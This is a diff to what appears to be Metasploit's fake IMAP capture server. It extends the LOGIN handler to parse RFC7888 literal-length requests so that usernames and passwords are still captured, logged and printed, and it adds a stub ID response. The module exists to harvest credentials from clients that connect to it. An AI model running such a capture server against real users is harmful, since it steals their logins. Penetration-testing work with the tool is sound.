@@ -74,16 +74,44 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if cmd.upcase == 'LOGIN'
-      @state[c][:user], @state[c][:pass] = arg.split(/\s+/, 2)
+      # If this is an RFC7888 request...
+      # (RFC7888 appends {size} to the end of the previous request)
+      if arg =~ /^\{[0-9]+\}$/
+        # Request more data
+        c.put "+ \r\n"
+
+        # Read the username + remove the RFC7888 length if it's present
+        username = c.get_once
+        return unless username
+        @state[c][:user] = username.strip.gsub(/ \{[0-9]+\}$/, '')
+
+        # Request more data
+        c.put "+ \r\n"
+
+        # Get the password
+        password = c.get_once
+        return unless password
+        @state[c][:pass] = password.strip.gsub(/ \{[0-9]+\}$/, '')
+      else
+        @state[c][:user], @state[c][:pass] = arg.split(/\s+/, 2)
+      end
 
       register_creds(@state[c][:ip], @state[c][:user], @state[c][:pass], 'imap')
       print_good("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+
       return
     end
 
     if cmd.upcase == 'LOGOUT'
       c.put("* BYE IMAP4rev1 Server logging out\r\n")
       c.put("#{num} OK LOGOUT completed\r\n")
+      return
+    end
+
+    if cmd.upcase == 'ID'
+      print_status("Got ID command")
+      c.put("* ID\r\n")
+      c.put("#{num} OK ID completed\r\n")
       return
     end
 
